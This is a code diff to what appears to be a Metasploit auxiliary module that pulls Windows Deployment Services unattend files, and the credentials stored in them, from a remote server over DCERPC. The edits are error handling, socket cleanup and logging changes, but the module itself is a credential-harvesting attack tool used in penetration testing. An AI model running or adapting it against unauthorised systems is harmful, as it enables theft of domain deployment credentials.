@@ -57,8 +57,13 @@ class Metasploit3 < Msf::Auxiliary
       query_host(ip)
     rescue ::Interrupt
       raise $!
-    rescue ::Exception => e
-      print_error("#{ip}:#{rport} error: #{e}")
+    rescue ::Rex::ConnectionError => e
+      print_error("#{ip}:#{rport} Connection Error: #{e}")
+    ensure
+      # Ensure socket is pulled down afterwards
+      self.dcerpc.socket.close rescue nil
+      self.dcerpc = nil
+      self.handle = nil
     end
   end
 
@@ -78,7 +83,7 @@ class Metasploit3 < Msf::Auxiliary
     print_status("Binding to #{handle} ...")
 
     self.dcerpc = Rex::Proto::DCERPC::Client.new(self.handle, self.sock)
-    print_good("Bound to #{handle}")
+    vprint_good("Bound to #{handle}")
 
     report_service(
       :host => rhost,
@@ -107,7 +112,7 @@ class Metasploit3 < Msf::Auxiliary
       rescue ::Rex::Proto::DCERPC::Exceptions::Fault => e
         vprint_error(e.to_s)
         print_error("#{rhost} DCERPC Fault - Windows Deployment Services is present but not configured. Perhaps an SCCM installation.")
-        return
+        return nil
       end
 
       unless result.nil?
@@ -116,7 +121,7 @@ class Metasploit3 < Msf::Auxiliary
 
         results.each do |result|
           unless result.empty?
-            unless result['username'].nil? || result['password'].nil?
+            if result['username'] and result['password']
               print_good("Retrived #{result['type']} credentials for #{architecture[0]}")
               creds_found = true
               domain = ""
@@ -158,7 +163,7 @@ class Metasploit3 < Msf::Auxiliary
 
     wdsc_packet = packet.create
 
-    print_status("Sending #{architecture[0]} Client Unattend request ...")
+    vprint_status("Sending #{architecture[0]} Client Unattend request ...")
     response = dcerpc.call(0, wdsc_packet)
 
     if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
@@ -184,8 +189,14 @@ class Metasploit3 < Msf::Auxiliary
 
   def extract_unattend(data)
     start = data.index('<?xml')
-    finish = data.index('</unattend>')+10
-    return data[start..finish]
+    finish = data.index('</unattend>')
+    if start and finish
+      finish += 10
+      return data[start..finish]
+    else
+      print_error("Incomplete transmission or malformed unattend file.")
+      return nil
+    end
   end
 
   def parse_client_unattend(data)
